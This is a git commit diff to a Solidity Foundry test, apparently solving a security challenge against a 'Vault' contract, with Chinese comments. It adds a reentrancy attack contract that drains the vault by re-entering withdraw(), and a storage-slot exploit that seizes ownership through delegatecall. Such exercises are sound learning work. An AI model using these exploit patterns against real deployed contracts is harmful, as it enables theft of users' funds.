6a6ef752bda324c63ca71cedee6dc239ab20bf9f
zhaoyu <94742242@qq.com>
2025-03-10 16:10:51 +0800

    编写重入攻击合约和插槽攻击测试

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -4,6 +4,27 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
 
+//重入攻击合约
+contract Attack {
+    Vault public vault;
+    uint256 public attackAmount;
+
+    constructor(address payable _vault) {
+        vault = Vault(_vault);
+    }
+
+    function startAttack() public payable{
+        attackAmount = msg.value;
+        vault.deposite{value: attackAmount}();
+        vault.withdraw();
+    }
+
+    receive() external payable {
+        if (address(vault).balance > 0 && address(vault).balance < attackAmount) {
+            vault.withdraw();
+        }
+    }
+}
 
 
 
@@ -15,24 +36,45 @@ contract VaultExploiter is Test {
     address palyer = address (2);
 
     function setUp() public {
-        vm.deal(owner, 1 ether);
-
+        vm.deal(owner, 100 ether);
         vm.startPrank(owner);
         logic = new VaultLogic(bytes32("0x1234"));
         vault = new Vault(address(logic));
-
-        vault.deposite{value: 0.1 ether}();
+        vault.deposite{value: 100 ether}();
         vm.stopPrank();
 
     }
 
     function testExploit() public {
-        vm.deal(palyer, 1 ether);
+        vm.deal(palyer, 500 ether);
         vm.startPrank(palyer);
 
-        // add your hacker code.
+        // 插槽攻击
+        // 编码changeOwner 
+        //1、密码传入VaultLogic的合约地址 
+        //2、Vault合约执行时使用的delegatecall 会把VaultLogic的代码部署到Vault的代码空间 
+        //3、在执行changeOwner时 password 会指向 VaultLogic的合约地址
+        //4、我们传入的密码为 VaultLogic的合约地址 判定条件会成立
+        //5、修改owner为攻击者地址
+        bytes memory data = abi.encodeWithSelector(VaultLogic.changeOwner.selector, address(logic), palyer);
 
-        require(vault.isSolve(), "solved");
+        //调用changeOwner
+        (bool success, ) = address(vault).call(data);
+        require(success, "call failed");
+        //验证owner是否被修改
+        assertEq(address(vault.owner()), palyer, "owner not changed");
+
+        //重入攻击
+        Attack attack = new Attack(payable(address(vault)));
+        // 打开提款
+        vault.openWithdraw();
+        
+        // 开始攻击
+        attack.startAttack{ value: 10 ether }();
+
+        // 验证攻击是否成功
+        assertEq(address(attack).balance, 110 ether, "balance not changed");
+     
         vm.stopPrank();
     }
 
